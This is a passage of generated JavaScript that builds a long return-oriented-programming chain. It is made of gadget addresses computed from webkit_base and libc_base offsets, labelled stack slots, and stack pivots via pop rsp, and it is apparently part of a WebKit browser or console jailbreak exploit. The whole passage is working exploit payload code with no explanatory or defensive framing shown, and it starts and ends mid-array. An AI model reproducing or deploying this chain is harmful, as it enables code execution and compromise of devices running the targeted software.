webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1137144, //L2225
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1137112, //L2223
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2223:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2224:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2225:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1137232, //L2227
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2227:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1137288, //L2228
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2228:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1137376, //L2231
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2230:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+763368,); //pop rcx
//L2231:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+20307877, //mov [rax], rcx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2233:
db([40, 0]); // 0x28
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1137504, //L2235
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1137520, //L2236
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2235:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2236:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1137664, //L2240
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1137632, //L2238
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1137648, //L2239
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2238:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2239:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2240:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1137760, //L2242
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2241:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L2242:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1137848, //L2244
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1137864, //L2245
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2244:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2245:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1138008, //L2249
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1137976, //L2247
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1137992, //L2248
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2247:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2248:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2249:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1138080, //L2251
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2251:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1138136, //L2252
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2252:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1138232, //L2255
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2254:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L2255:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1138320, //L2257
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1138336, //L2258
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2257:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2258:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1138496, //L2261
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1138528, //L2263
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1138480, //L2260
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1138512, //L2262
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2260:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2261:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2262:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2263:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1138656, //L2265
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1138672, //L2266
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1138640, //L2264
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2264:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2265:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2266:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1138760, //L2268
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2268:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1138816, //L2269
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2269:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1138912, //L2272
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2272:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1138968, //L2273
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2273:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2275:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L2276:
db([16, 0]); // 0x10
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1139120, //L2278
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2278:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1139176, //L2279
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2279:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1139296, //L2282
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2281:
db([32, 0]); // 0x20
set_gadget(libc_base+763368,); //pop rcx
//L2282:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1139384, //L2284
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1139400, //L2285
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2284:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2285:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1139544, //L2289
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1139512, //L2287
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1139528, //L2288
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2287:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2288:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2289:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1139640, //L2291
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2290:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+763368,); //pop rcx
//L2291:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1139728, //L2293
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1139744, //L2294
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2293:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2294:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1139888, //L2298
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1139856, //L2296
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1139872, //L2297
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2296:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2297:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2298:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L2300:
ropchain+1139992, //L2299
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1069936, //_create_extcall
//L2299:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1140080, //L2302
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2301:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+763368,); //pop rcx
//L2302:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1140168, //L2304
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1140184, //L2305
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2304:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2305:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1140328, //L2309
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1140296, //L2307
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1140312, //L2308
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2307:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2308:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2309:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L2310:
jop_frame_addr,
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1140472, //L2312
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2311:
db([24, 0]); // 0x18
set_gadget(libc_base+763368,); //pop rcx
//L2312:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1140560, //L2314
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1140576, //L2315
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2314:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2315:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1140720, //L2319
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1140688, //L2317
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1140704, //L2318
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2317:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2318:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2319:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1140816, //L2321
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2320:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L2321:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1140904, //L2323
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1140920, //L2324
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2323:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2324:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1141064, //L2328
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1141032, //L2326
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1141048, //L2327
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2326:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2327:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2328:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L2330:
ropchain+1141168, //L2329
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1143376, //L2331
//L2329:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1141312, //L2333
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1141328, //L2334
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1141296, //L2332
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2332:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2333:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2334:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1141456, //L2336
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1141472, //L2337
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1141440, //L2335
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2335:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2336:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2337:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1141576, //L2338
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1141592, //L2339
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2338:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2339:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1141712, //L2340
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1141696, //L2341
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2341:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1141800, //L2343
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1141784, //L2342
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2342:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2343:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1141904, //L2344
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1141920, //L2345
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2344:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2345:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1142040, //L2346
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1142024, //L2347
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2347:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2346:
db([0, 0]); // 0x0
//L2121:
set_gadget(libc_base+764760,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+1438842, //pop rdx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+3236123, //pop r9
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+756281, //xor rax, rax
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+11, //nop
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+764760, //pop rsi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+763368, //pop rcx
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+144605, //pop rdi
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
webkit_base+568675, //pop r8
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
libc_base+782311, //pop rsp
libc_base+426295, //mov [rdi], rax
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
